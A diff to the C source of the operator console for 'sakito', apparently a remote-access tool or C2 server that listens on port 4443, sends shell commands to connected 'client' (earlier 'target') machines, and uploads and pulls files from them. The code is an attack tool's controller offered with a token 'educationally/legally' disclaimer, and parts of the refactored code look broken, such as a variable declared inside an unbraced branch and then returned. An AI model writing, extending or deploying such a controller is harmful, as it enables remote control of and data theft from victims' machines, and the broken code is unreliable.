@@ -6,9 +6,12 @@ Use this code educationally/legally.
 #include <stdio.h>
 #include <stdlib.h>
 #include <stdint.h>
-#include "sakito_tools.h"
+#include <inttypes.h>
+#include "sakito_core.h"
+#include "sakito_server_tools.h"
 
 #define PORT 4443
+#define MEM_CHUNK 5
 
 #pragma comment(lib, "ws2_32.lib")
 
@@ -116,84 +119,60 @@ DWORD WINAPI accept_conns(LPVOID* lp_param) {
 	return -1;
 }
 
-// Function to upload file to target machine (TCP file transfer).
+// Wrapper function for sending file to client (TCP file transfer).
 int send_file(char* const buf, const size_t cmd_len, const SOCKET client_socket) {
 	// '3' is the command code for uploading a file via the client.
 	buf[7] = '3';
 
 	// Send command code + filename to be parsed.
-	if (send(client_socket, &buf[7], cmd_len, 0) < 1)
+	if (send(client_socket, buf+7, cmd_len, 0) < 1)
 		return SOCKET_ERROR;
 
-	// Open file.
-	FILE* fd = fopen(&buf[8], "rb");
-	uint32_t bytes = 0, f_size = 0;
+	int32_t f_size = 0;
 
-	// If the file exists:
-	if (fd) {
-		// Get file size and serialize f_size.
-		fseek(fd, 0L, SEEK_END);
-		f_size = ftell(fd);
-		bytes = htonl(f_size);
-		fseek(fd, 0L, SEEK_SET);
+	// Open file with read permissions.
+	HANDLE h_file = sakito_win_openf(buf+8, GENERIC_READ, OPEN_EXISTING);
+
+	// If File Exists.
+	if (h_file == INVALID_HANDLE_VALUE) {
+		puts("File not found.\n");
+		return FILE_NOT_FOUND;
 	}
 
-	if (send(client_socket, (char*)&bytes, sizeof(bytes), 0) < 1)
-		return SOCKET_ERROR;
+	// Get file size and serialize file size bytes.
+	LARGE_INTEGER largeint_struct;
+	GetFileSizeEx(h_file, &largeint_struct);
+	f_size = (int32_t)largeint_struct.QuadPart;
 
-	// Initialize i_result to true.
-	int i_result = 1;
-
-	if (f_size) {
-		// Recursively read file until EOF is detected and send file bytes to client in BUFLEN chunks.
-		int bytes_read;
-		while (!feof(fd) && i_result > 0) {
-			if (bytes_read = fread(buf, 1, BUFLEN, fd))
-				// Send file's bytes chunk to remote server.
-				i_result = send(client_socket, buf, bytes_read, 0);
-			else
-				break;
-		}
-		// Close the file.
-		fclose(fd);
-	}
-
-	return i_result;
+	// Windows TCP file transfer (receive) function located in sakito_tools.h.
+	return sakito_win_sendf(h_file, client_socket, buf, f_size);
 }
 
-// Function to receive file from target machine (TCP file transfer).
+// Function to receive file from client (TCP file transfer).
 int recv_file(char* const buf, const size_t cmd_len, const SOCKET client_socket) {
 	// '4' is the command code for downloading a file via the client.
 	buf[9] = '4';
 
 	// Send command code + filename to be parsed.
-	if (send(client_socket, &buf[9], cmd_len, 0) < 1)
+	if (send(client_socket, buf+9, cmd_len, 0) < 1)
 		return SOCKET_ERROR;
 
-	FILE* fd = fopen(&buf[10], "wb");
+	HANDLE h_file = sakito_win_openf(buf+10, GENERIC_WRITE, CREATE_ALWAYS);
 
-	// Receive file size serialized uint32_t bytes.
+	// Receive file size.
 	if (recv(client_socket, buf, sizeof(uint32_t), 0) < 1)
 		return SOCKET_ERROR;
 
-	// Deserialize file size bytes.
+	// Deserialize f_size.
 	uint32_t f_size = ntohl_conv(&*(buf));
-	
-	// Initialize i_result to true.
-	int i_result = 1;
 
-	// Varaible to keep track of downloaded data bytes.
-	long int total = 0;
+	if (f_size > 0)
+		// Windows TCP file transfer (recv) function located in sakito_tools.h.
+		int i_result = sakito_win_recvf(h_file, client_socket, buf, f_size);
+	else if (f_size == -1)
+		puts("The client's system cannot find the file specified.\n");
 
-	// Receive all file bytes/chunks and write to file until total == file size.
-	while (total != f_size && i_result > 0) {
-		i_result = recv(client_socket, buf, BUFLEN, 0);
-		fwrite(buf, 1, i_result, fd);
-		total += i_result;
-	}
-
-	// Close the file.
-	fclose(fd);
+	CloseHandle(h_file);
 
 	return i_result;
 }
@@ -204,7 +183,7 @@ int client_cd(char* const buf, const size_t cmd_len, const SOCKET client_socket)
 	buf[3] = '1';
 	
 	// Send command code + directory to be parsed.
-	if (send(client_socket, &buf[3], cmd_len, 0) < 1)
+	if (send(client_socket, buf+3, cmd_len, 0) < 1)
 		return SOCKET_ERROR;
 
 	return 1;
@@ -218,19 +197,17 @@ int terminate_client(char* const buf, const size_t cmd_len, const SOCKET client_
 	return 0;
 }
 
+int detect_eos(int i_result, char* const buf) {
+	if (buf[0] == '\x11' && buf[1] == '\x13' && buf[2] == '\xcf')
+		return 1;
+	return 0;
+}
 
 // Function to send command to client.
 int send_cmd(char* const buf, const size_t cmd_len, const SOCKET client_socket) {
 	// Send command to server.
 	if (send(client_socket, buf, cmd_len, 0) < 1)
-		return SOCKET_ERROR;
-
-	// Receive output stream size serialized uint32_t bytes.
-	if (recv(client_socket, buf, sizeof(uint32_t), 0) < 1)
-		return SOCKET_ERROR;
-
-	// Deserialize stream size bytes.
-	uint32_t s_size = ntohl_conv(&*(buf));
+		return -1;
 
 	// Initialize i_result to true.
 	int i_result = 1;
@@ -239,10 +216,12 @@ int send_cmd(char* const buf, const size_t cmd_len, const SOCKET client_socket) 
 	do {
 		if ((i_result = recv(client_socket, buf, BUFLEN, 0)) < 1)
 			return i_result;
+		if (detect_eos(i_result, buf))
+			break;
 		fwrite(buf, 1, i_result, stdout);
-	} while ((s_size -= i_result) > 0);
+	} while (i_result > 0);
 
-	// Write single newline character to stdout for cmd line alignment.
+	// write a single newline to stdout for cmd line output alignment.
 	fputc('\n', stdout);
 
 	return i_result;
@@ -305,8 +284,8 @@ void interact(Conn_map* conns, char* const buf, const int client_id) {
 		memset(buf, '\0', BUFLEN);
 
 		buf[0] = '0';
-		size_t cmd_len = get_line(&buf[1]) + 1;
-		char* cmd = &buf[1];
+		size_t cmd_len = get_line(buf+1) + 1;
+		char* cmd = buf+1;
 
 		if (cmd_len > 1) {
 			if (compare(cmd, "background")) {
@@ -326,26 +305,31 @@ void interact(Conn_map* conns, char* const buf, const int client_id) {
 	printf("Client: \"%s\" is no longer connected.\n\n", client_host);
 }
 
-// Function to execute command.
-void exec_cmd(char* const buf) {
-	// Call Popen to execute command(s) and read the processes' output.
-	FILE* fpipe = _popen(buf, "r");
-	fseek(fpipe, 0, SEEK_END);
-	size_t cmd_len = ftell(fpipe);
-	fseek(fpipe, 0, SEEK_SET);
+void terminate_console(HANDLE acp_thread, Conn_map conns) {
+	// Quit accepting connections.
+	TerminateThread(acp_thread, 0);
+	// if there's any connections close them before exiting.
+	if (conns.size) {
+		for (size_t i = 0; i < conns.size; i++)
+			closesocket(conns.clients[i].sock);
+		// Free allocated memory.
+		free(conns.clients);
+	}
+	terminate_server(conns.listen_socket, NULL);
+}
 
-	// Stream/write command output to stdout.
-	int rb = 0;
-	do {
-		rb = fread(buf, 1, BUFLEN, fpipe);
-		fwrite(buf, 1, rb, stdout);
-	} while (rb == BUFLEN);
+void validate_id(char buf[], Conn_map conns) {
+	int client_id;
+	client_id = atoi(buf+9);
+	if (!conns.size || client_id < 0 || client_id > conns.size - 1)
+		printf("Invalid client identifier.\n");
+	else
+		interact(&conns, buf, client_id);
+}
 
-	// Write single newline character to stdout for cmd line alignment.
+void exec_cmd(char buf[]) {
+	sakito_win_cp((SOCKET)NULL, buf);
 	fputc('\n', stdout);
-
-	// Close the pipe.
-	_pclose(fpipe);
 }
 
 // Main function for parsing console input and calling sakito-console functions.
@@ -367,33 +351,19 @@ int main(void) {
 
 		if (cmd_len > 1) {
 			if (compare(buf, "exit")) {
-				// Quit accepting connections.
-				TerminateThread(acp_thread, 0);
-				// if there's any connections close them before exiting.
-				if (conns.size) {
-					for (size_t i = 0; i < conns.size; i++)
-						closesocket(conns.clients[i].sock);
-					// Free allocated memory.
-					free(conns.clients);
-				}
-				terminate_server(conns.listen_socket, NULL);
+				terminate_console(acp_thread, conns);
 			}
 			else if (compare(buf, "cd ")) {
 				// List all connections.
-				_chdir(&buf[3]);
+				_chdir(buf+3);
 			}
 			else if (compare(buf, "list")) {
 				// List all connections.
 				list_connections(&conns);
 			}
 			else if (compare(buf, "interact ")) {
-				// Interact with client.
-				int client_id;
-				client_id = atoi(&buf[9]);
-				if (!conns.size || client_id < 0 || client_id > conns.size - 1)
-					printf("Invalid client identifier.\n");
-				else
-					interact(&conns, buf, client_id);
+				// If ID is valid interact with client.
+				validate_id(buf, conns);
 			}
 			else {
 				// Execute command on host system.
